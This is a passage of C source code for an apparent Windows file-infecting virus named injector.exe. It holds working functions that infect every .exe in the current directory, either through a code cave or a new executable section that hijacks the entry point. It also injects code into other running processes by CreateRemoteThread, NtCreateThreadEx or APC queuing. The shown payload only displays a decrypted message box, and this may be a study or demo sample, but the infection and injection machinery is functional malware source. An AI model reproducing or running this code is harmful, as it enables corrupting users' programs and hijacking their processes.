    return TRUE;
}

static BOOL FindTargetThread(DWORD pid, DWORD* outTid) {
    if (!outTid) return FALSE;
    *outTid = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf(" [ERROR] Thread snapshot failed: %lu\n", GetLastError());
        return FALSE;
    }

    THREADENTRY32 te = { sizeof(te) };
    if (!Thread32First(snapshot, &te)) {
        printf(" [ERROR] Thread32First failed: %lu\n", GetLastError());
        CloseHandle(snapshot);
        return FALSE;
    }

    do {
        if (te.th32OwnerProcessID == pid) {
            *outTid = te.th32ThreadID;
            break;
        }
    } while (Thread32Next(snapshot, &te));

    CloseHandle(snapshot);
    return *outTid != 0;
}

static BOOL LoadDecodedMessage(char* outMsg, size_t outSize) {
    if (!outMsg || outSize < sizeof(encrypted_message)) {
        return FALSE;
    }
    DecryptPayload((BYTE*)outMsg, encrypted_message, sizeof(encrypted_message));
    return TRUE;
}



static BOOL InjectPidCreateRemoteThread(DWORD pid, BOOL useSyscalls, const NT_FUNCTIONS* nt, BOOL useNtThread) {
    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);
    if (!hProc) {
        printf(" [WARN] OpenProcess(%u): %lu\n", pid, GetLastError());
        return FALSE;
    }
    printf(" [DEBUG] OpenProcess succeeded: hProc=%p\n", hProc);

    char decoded_msg[sizeof(encrypted_message)];
    if (!LoadDecodedMessage(decoded_msg, sizeof(decoded_msg))) {
        CloseHandle(hProc);
        return FALSE;
    }

    LPVOID remoteMsg = NULL;
    if (!RemoteAllocWrite(
        hProc,
        decoded_msg,
        sizeof(decoded_msg),
        PAGE_READWRITE,
        PAGE_READWRITE,
        useSyscalls,
        nt,
        &remoteMsg)) {
        CloseHandle(hProc);
        return FALSE;
    }
    printf(" [DEBUG] wrote %zu bytes to remoteMsg=%p\n", sizeof(decoded_msg), remoteMsg);

    HMODULE u32 = LoadLibraryA("user32.dll");
    FARPROC pMsg = GetProcAddress(u32, "MessageBoxA");
    FARPROC pExit = GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitThread");
    DWORD64 rMsg = GetRemoteAddressByRVA(pid, "user32.dll", pMsg);
    DWORD64 rExit = GetRemoteAddressByRVA(pid, "kernel32.dll", pExit);
    printf(" [DEBUG] remote MessageBoxA=%llx  ExitThread=%llx\n", rMsg, rExit);
    if (!rMsg || !rExit) {
        CloseHandle(hProc);
        return FALSE;
    }

    BYTE stub[STUB_SIZE];
    if (!BuildRemoteStubCrt(stub, sizeof(stub), remoteMsg, (uintptr_t)rMsg, (uintptr_t)rExit)) {
        CloseHandle(hProc);
        return FALSE;
    }

    LPVOID remoteThunk = NULL;
    if (!RemoteAllocWrite(
        hProc,
        stub,
        sizeof(stub),
        PAGE_READWRITE,
        PAGE_EXECUTE_READ,
        useSyscalls,
        nt,
        &remoteThunk)) {
        CloseHandle(hProc);
        return FALSE;
    }
    printf(" [DEBUG] Wrote stub to remoteThunk=%p\n", remoteThunk);

    HANDLE hTh = NULL;
    if (useNtThread && nt && nt->NtCreateThreadEx) {
        NTSTATUS status = nt->NtCreateThreadEx(
            &hTh,
            THREAD_ALL_ACCESS,
            NULL,
            hProc,
            (PVOID)remoteThunk,
            NULL,
            0,
            0,
            0,
            0,
            NULL);
        if (!NT_SUCCESS(status)) {
            printf(" [WARN] NtCreateThreadEx failed: 0x%08X\n", status);
            hTh = NULL;
        }
    }

    if (!hTh) {
        hTh = CreateRemoteThread(
            hProc, NULL, 0,
            (LPTHREAD_START_ROUTINE)remoteThunk,
            NULL, 0, NULL);
    }
    if (!hTh) {
        printf(" [ERROR] CreateRemoteThread: %lu\n", GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }
    printf(" [DEBUG] CreateRemoteThread succeeded: hTh=%p\n", hTh);

    CloseHandle(hTh);
    CloseHandle(hProc);
    return TRUE;
}

static BOOL InjectPidApc(DWORD pid) {
    HANDLE hProc = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);
    if (!hProc) {
        printf(" [WARN] OpenProcess(%u): %lu\n", pid, GetLastError());
        return FALSE;
    }

    char decoded_msg[sizeof(encrypted_message)];
    if (!LoadDecodedMessage(decoded_msg, sizeof(decoded_msg))) {
        CloseHandle(hProc);
        return FALSE;
    }

    LPVOID remoteMsg = NULL;
    if (!RemoteAllocWrite(
        hProc,
        decoded_msg,
        sizeof(decoded_msg),
        PAGE_READWRITE,
        PAGE_READWRITE,
        FALSE,
        NULL,
        &remoteMsg)) {
        CloseHandle(hProc);
        return FALSE;
    }

    HMODULE u32 = LoadLibraryA("user32.dll");
    FARPROC pMsg = GetProcAddress(u32, "MessageBoxA");
    DWORD64 rMsg = GetRemoteAddressByRVA(pid, "user32.dll", pMsg);
    printf(" [DEBUG] remote MessageBoxA=%llx\n", rMsg);
    if (!rMsg) {
        CloseHandle(hProc);
        return FALSE;
    }

    BYTE stub[APC_STUB_SIZE];
    if (!BuildRemoteStubApc(stub, sizeof(stub), remoteMsg, (uintptr_t)rMsg)) {
        CloseHandle(hProc);
        return FALSE;
    }

    LPVOID remoteThunk = NULL;
    if (!RemoteAllocWrite(
        hProc,
        stub,
        sizeof(stub),
        PAGE_READWRITE,
        PAGE_EXECUTE_READ,
        FALSE,
        NULL,
        &remoteThunk)) {
        CloseHandle(hProc);
        return FALSE;
    }

    DWORD tid = 0;
    if (!FindTargetThread(pid, &tid)) {
        printf(" [ERROR] No thread found for APC injection\n");
        CloseHandle(hProc);
        return FALSE;
    }

    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, tid);
    if (!hThread) {
        printf(" [ERROR] OpenThread(%u) failed: %lu\n", tid, GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }

    if (QueueUserAPC((PAPCFUNC)remoteThunk, hThread, 0) == 0) {
        printf(" [ERROR] QueueUserAPC failed: %lu\n", GetLastError());
        CloseHandle(hThread);
        CloseHandle(hProc);
        return FALSE;
    }
    printf(" [DEBUG] Queued APC on TID=%u\n", tid);

    CloseHandle(hThread);
    CloseHandle(hProc);
    return TRUE;
}

static BOOL InjectPidSyscall(DWORD pid) {
    NT_FUNCTIONS nt = { 0 };
    if (!ResolveNtFunctions(&nt)) {
        printf(" [WARN] Nt* syscall path unavailable, falling back to CRT\n");
        return InjectPidCreateRemoteThread(pid, FALSE, NULL, FALSE);
    }
    return InjectPidCreateRemoteThread(pid, TRUE, &nt, nt.NtCreateThreadEx != NULL);
}

/**
 * \fn static BOOL InjectPid(DWORD pid, INJECTION_TECHNIQUE technique)
 * \brief Inject and execute a small stub in a remote process to display a MessageBox.
 *
 * \param pid Process ID of the target process.
 * \param technique Injection technique to use.
 * \return TRUE on successful injection and thread creation, FALSE otherwise.
 */
BOOL InjectPid(DWORD pid, INJECTION_TECHNIQUE technique) {
    printf("[DEBUG] InjectPid: entry pid=%u\n", pid);

    DWORD mySess = 0, peerSess = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &mySess);
    if (!ProcessIdToSessionId(pid, &peerSess) || peerSess != mySess) {
        printf(" [DEBUG] skip pid=%u (sess %u!=%u)\n", pid, peerSess, mySess);
        return FALSE;
    }

    switch (technique) {
    case INJECT_TECHNIQUE_APC:
        return InjectPidApc(pid);
    case INJECT_TECHNIQUE_SYSCALL:
        return InjectPidSyscall(pid);
    case INJECT_TECHNIQUE_CRT:
    default:
        return InjectPidCreateRemoteThread(pid, FALSE, NULL, FALSE);
    }
}


/**
 * \fn static DWORD FindTargetPid(const char* name)
 * \brief Locate the PID of a running process by executable name, with fallback to any injectable process.
 *
 * \param name The exact executable name to search for (e.g. "notepad.exe"), or NULL for fallback only.
 * \return The PID of the matching process, or 0 if none found.
 */
DWORD FindTargetPid(const char* name) {
    printf("[DEBUG] FindTargetPid: entry name=%s\n", name ? name : "<NULL>");
    PROCESSENTRY32 pe = { sizeof(pe) };
    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (processSnapshot == INVALID_HANDLE_VALUE) { 
        printf("[ERROR] FindTargetPid: Snapshot failed\n"); 
        return 0; 
    }
    DWORD pid = 0;
    char selfName[MAX_PATH]; 
    GetModuleFileNameA(NULL, selfName, MAX_PATH);
    char* base = strrchr(selfName, '\\'); 
    base = base ? base + 1 : selfName;
    
    if (name) {
        if (!Process32First(processSnapshot, &pe)) {
            printf("[ERROR] FindTargetPid: Process32First failed\n");
            CloseHandle(processSnapshot);
            return 0;
        }
        do {
            printf("[DEBUG] FindTargetPid: checking %s (PID=%u)\n", pe.szExeFile, pe.th32ProcessID);
            if (!_stricmp(pe.szExeFile, name)) { 
                pid = pe.th32ProcessID; 
                break; 
            }
        } while (Process32Next(processSnapshot, &pe));
    }
    if (!pid) {
        if (!Process32First(processSnapshot, &pe)) {
            printf("[ERROR] FindTargetPid: Process32First failed\n");
            CloseHandle(processSnapshot);
            return 0;
        }
        do {
            if (pe.th32ProcessID <= 4) continue;
            if (!_stricmp(pe.szExeFile, base)) continue;
            HANDLE hTest = OpenProcess(PROCESS_CREATE_THREAD, FALSE, pe.th32ProcessID);
            if (hTest) { 
                pid = pe.th32ProcessID; 
                printf("[DEBUG] FindTargetPid: fallback %s (PID=%u)\n", pe.szExeFile, pid); 
                CloseHandle(hTest); 
                break; 
            }
        } while (Process32Next(processSnapshot, &pe));
    }
    CloseHandle(processSnapshot);
    printf("[DEBUG] FindTargetPid: exit -> %u\n", pid);
    return pid;
}

/**
 * \fn static BOOL InfectFile(const char* path, BOOL useSection)
 * \brief Infect a PE file via code cave (default) or new section injection.
 *
 * \param path File path of the target PE executable.
 * \param useSection When TRUE, force new section infection instead of code cave.
 * \return TRUE on successful infection, FALSE on failure or if already infected.
 */
static BOOL InfectFile(const char* path, BOOL useSection) {
    printf("[DEBUG] InfectFile: path=%s\n", path);

    HANDLE hFile = CreateFileA(
        path,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[ERROR] CreateFileA(%s) failed: 0x%08X\n", path, GetLastError());
        return FALSE;
    }

    DWORD fileEnd = GetFileSize(hFile, NULL);
    if (fileEnd == INVALID_FILE_SIZE || fileEnd == 0) {
        printf("[ERROR] GetFileSize failed\n");
        CloseHandle(hFile);
        return FALSE;
    }

    IMAGE_DOS_HEADER dos;
    DWORD rd = 0;
    if (!ReadFile(hFile, &dos, sizeof(dos), &rd, NULL) || rd != sizeof(dos)) {
        printf("[ERROR] ReadFile DOS header failed\n");
        CloseHandle(hFile);
        return FALSE;
    }
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[DEBUG] Not a PE file: %s\n", path);
        CloseHandle(hFile);
        return FALSE;
    }

    SetFilePointer(hFile, dos.e_lfanew, NULL, FILE_BEGIN);
    IMAGE_NT_HEADERS64 nt;
    if (!ReadFile(hFile, &nt, sizeof(nt), &rd, NULL) || rd != sizeof(nt)) {
        printf("[ERROR] ReadFile NT headers failed\n");
        CloseHandle(hFile);
        return FALSE;
    }
    if (nt.Signature != IMAGE_NT_SIGNATURE || nt.FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        printf("[DEBUG] Unsupported PE type: %s\n", path);
        CloseHandle(hFile);
        return FALSE;
    }

    WORD nsec = nt.FileHeader.NumberOfSections;
    DWORD optSize = nt.FileHeader.SizeOfOptionalHeader;
    IMAGE_SECTION_HEADER* secs = malloc(nsec * sizeof(*secs));
    if (!secs) {
        printf("[ERROR] malloc failed\n");
        CloseHandle(hFile);
        return FALSE;
    }

    SetFilePointer(hFile, dos.e_lfanew + offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + optSize,
        NULL, FILE_BEGIN);
    if (!ReadFile(hFile, secs, nsec * sizeof(*secs), &rd, NULL) || rd != nsec * sizeof(*secs)) {
        printf("[ERROR] ReadFile section headers failed\n");
        free(secs);
        CloseHandle(hFile);
        return FALSE;
    }

    BYTE* fileData = malloc(fileEnd);
    if (!fileData) {
        printf("[ERROR] malloc failed\n");
        free(secs);
        CloseHandle(hFile);
        return FALSE;
    }
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    if (!ReadFile(hFile, fileData, fileEnd, &rd, NULL) || rd != fileEnd) {
        printf("[ERROR] ReadFile file data failed\n");
        free(fileData);
        free(secs);
        CloseHandle(hFile);
        return FALSE;
    }

    for (WORD i = 0; i < nsec; i++) {
        if (!_stricmp((char*)secs[i].Name, VIRUS_SECTION_NAME)) {
            printf("[DEBUG] Already infected: %s\n", path);
            free(fileData);
            free(secs);
            CloseHandle(hFile);
            return FALSE;
        }
    }

    DWORD entryOffset = 0;
    if (RvaToFileOffset(secs, nsec, nt.OptionalHeader.AddressOfEntryPoint, &entryOffset) &&
        entryOffset + STATIC_STUB_SIZE <= fileEnd) {
        if (memcmp(
            fileData + entryOffset + (STATIC_STUB_SIZE - STATIC_STUB_SIGNATURE_SIZE),
            STATIC_STUB_SIGNATURE,
            STATIC_STUB_SIGNATURE_SIZE) == 0) {
            printf("[DEBUG] Already infected (signature): %s\n", path);
            free(fileData);
            free(secs);
            CloseHandle(hFile);
            return FALSE;
        }
    }

    BYTE staticStub[STATIC_STUB_SIZE];
    DWORD originalEntryRva = nt.OptionalHeader.AddressOfEntryPoint;
    if (!BuildStaticStub(staticStub, sizeof(staticStub), originalEntryRva)) {
        printf("[ERROR] BuildStaticStub failed\n");
        free(fileData);
        free(secs);
        CloseHandle(hFile);
        return FALSE;
    }

    if (!useSection) {
        DWORD caveRva = 0;
        DWORD caveOffset = 0;
        if (!FindCodeCave(secs, nsec, fileData, fileEnd, sizeof(staticStub), &caveRva, &caveOffset)) {
            printf("[ERROR] No suitable code cave found for %s\n", path);
            free(fileData);
            free(secs);
            CloseHandle(hFile);
            return FALSE;
        }

        nt.OptionalHeader.AddressOfEntryPoint = caveRva;
        SetFilePointer(hFile, dos.e_lfanew, NULL, FILE_BEGIN);
        if (!WriteFile(hFile, &nt, sizeof(nt), &rd, NULL)) {
            printf("[ERROR] WriteFile NT headers failed\n");
            free(fileData);
            free(secs);
            CloseHandle(hFile);
            return FALSE;
        }

        SetFilePointer(hFile, caveOffset, NULL, FILE_BEGIN);
        if (!WriteFile(hFile, staticStub, sizeof(staticStub), &rd, NULL)) {
            printf("[ERROR] WriteFile cave payload failed\n");
            free(fileData);
            free(secs);
            CloseHandle(hFile);
            return FALSE;
        }

        printf("[DEBUG] Successfully infected (code cave): %s\n", path);
        free(fileData);
        free(secs);
        CloseHandle(hFile);
        return TRUE;
    }

    DWORD headerEnd = dos.e_lfanew + offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + optSize +
        ((nsec + 1) * sizeof(*secs));
    DWORD firstSectionOffset = secs[0].PointerToRawData;
    for (WORD i = 1; i < nsec; i++) {
        if (secs[i].PointerToRawData < firstSectionOffset) {
            firstSectionOffset = secs[i].PointerToRawData;
        }
    }
    if (firstSectionOffset < headerEnd) {
        printf("[ERROR] Not enough header slack to add section header\n");
        free(fileData);
        free(secs);
        CloseHandle(hFile);
        return FALSE;
    }

    IMAGE_SECTION_HEADER newSec = { 0 };
    memcpy(newSec.Name, VIRUS_SECTION_NAME, IMAGE_SIZEOF_SHORT_NAME);
    DWORD fa = nt.OptionalHeader.FileAlignment;
    DWORD sa = nt.OptionalHeader.SectionAlignment;
    IMAGE_SECTION_HEADER* last = &secs[nsec - 1];
    DWORD endVA = last->VirtualAddress + max(last->Misc.VirtualSize, last->SizeOfRawData);
    DWORD newRVA = AlignUp(endVA, sa);
    DWORD newPtr = AlignUp(fileEnd, fa);

    newSec.Misc.VirtualSize = sizeof(staticStub);
    newSec.VirtualAddress = newRVA;
    newSec.SizeOfRawData = AlignUp(sizeof(staticStub), fa);
    newSec.PointerToRawData = newPtr;
    newSec.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    nt.FileHeader.NumberOfSections++;
    nt.OptionalHeader.AddressOfEntryPoint = newRVA;
    nt.OptionalHeader.SizeOfImage = AlignUp(newRVA + sizeof(staticStub), sa);

    SetFilePointer(hFile, dos.e_lfanew, NULL, FILE_BEGIN);
    WriteFile(hFile, &nt, sizeof(nt), &rd, NULL);

    SetFilePointer(hFile,
        dos.e_lfanew + offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + optSize + (nsec * sizeof(*secs)),
        NULL, FILE_BEGIN);
    WriteFile(hFile, &newSec, sizeof(newSec), &rd, NULL);

    if (newPtr > fileEnd) {
        DWORD pad = newPtr - fileEnd;
        BYTE* zero = calloc(pad, 1);
        if (!zero) {
            printf("[ERROR] calloc failed\n");
            free(fileData);
            free(secs);
            CloseHandle(hFile);
            return FALSE;
        }
        SetFilePointer(hFile, 0, NULL, FILE_END);
        WriteFile(hFile, zero, pad, &rd, NULL);
        free(zero);
    }

    SetFilePointer(hFile, newPtr, NULL, FILE_BEGIN);
    WriteFile(hFile, staticStub, sizeof(staticStub), &rd, NULL);

    printf("[DEBUG] Successfully infected (new section): %s\n", path);
    free(fileData);
    free(secs);
    CloseHandle(hFile);
    return TRUE;
}


static void PrintUsage(const char* exeName) {
    printf("Usage: %s [--technique crt|apc|syscall] [--section]\n", exeName);
}

/**
 * \fn int main(void)
 * \brief Entry point: infects all EXEs in the current directory and attempts process injection.
 *
 * \return Exit code (0 on success, non-zero on error).
 */
int main(int argc, char** argv) {
    printf("[DEBUG] Lancement injector.exe\n");

    INJECTION_TECHNIQUE technique = INJECT_TECHNIQUE_CRT;
    BOOL useSection = FALSE;
    for (int i = 1; i < argc; i++) {
        if (!_stricmp(argv[i], "--technique") && i + 1 < argc) {
            const char* value = argv[++i];
            if (!_stricmp(value, "crt")) {
                technique = INJECT_TECHNIQUE_CRT;
            }
            else if (!_stricmp(value, "apc")) {
                technique = INJECT_TECHNIQUE_APC;
            }
            else if (!_stricmp(value, "syscall")) {
                technique = INJECT_TECHNIQUE_SYSCALL;
            }
            else {
                printf("[ERROR] Unknown technique: %s\n", value);
                PrintUsage(argv[0]);
                return 1;
            }
        }
        else if (!_stricmp(argv[i], "--section")) {
            useSection = TRUE;
        }
        else if (!_stricmp(argv[i], "--help") || !_stricmp(argv[i], "-h")) {
            PrintUsage(argv[0]);
            return 0;
        }
        else {
            printf("[ERROR] Unknown option: %s\n", argv[i]);
            PrintUsage(argv[0]);
            return 1;
        }
    }

    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    const char* selfName = strrchr(selfPath, '\\');
    selfName = selfName ? selfName + 1 : selfPath;

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA("*.exe", &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (_stricmp(fd.cFileName, selfName) != 0) {
                InfectFile(fd.cFileName, useSection);
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }

    DWORD pid = FindTargetPid(TARGET_PROCESS_NAME);
    if (pid) {
        printf("[DEBUG] Found %s (PID=%u), injecting...\n", TARGET_PROCESS_NAME, pid);
        if (InjectPid(pid, technique)) {
            printf("[DEBUG] Injection succeeded for %s (PID=%u)\n", TARGET_PROCESS_NAME, pid);
            goto done;
        }
        else {
            printf("[WARN] Injection failed for %s (PID=%u)\n", TARGET_PROCESS_NAME, pid);
        }
    }
    /*else {
        printf("[DEBUG] %s not found, attempting fallback injection\n", TARGET_PROCESS_NAME);
    }*/

    PROCESSENTRY32 pe = { sizeof(pe) };
    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (processSnapshot == INVALID_HANDLE_VALUE) {
        printf("[ERROR] Could not snapshot processes\n");
        return 1;
    }

    if (!Process32First(processSnapshot, &pe)) {
        printf("[ERROR] Process32First failed\n");
        CloseHandle(processSnapshot);
        return 1;
    }
    do {
        if (_stricmp(pe.szExeFile, selfName) == 0)
            continue;
        if (InjectPid(pe.th32ProcessID, technique)) {
            printf("[DEBUG] Injection succeeded for %s (PID=%u)\n",
                pe.szExeFile, pe.th32ProcessID);
            break;
        }
    } while (Process32Next(processSnapshot, &pe));
    CloseHandle(processSnapshot);

done:
    printf("[DEBUG] Fin \n");
    return 0;
}
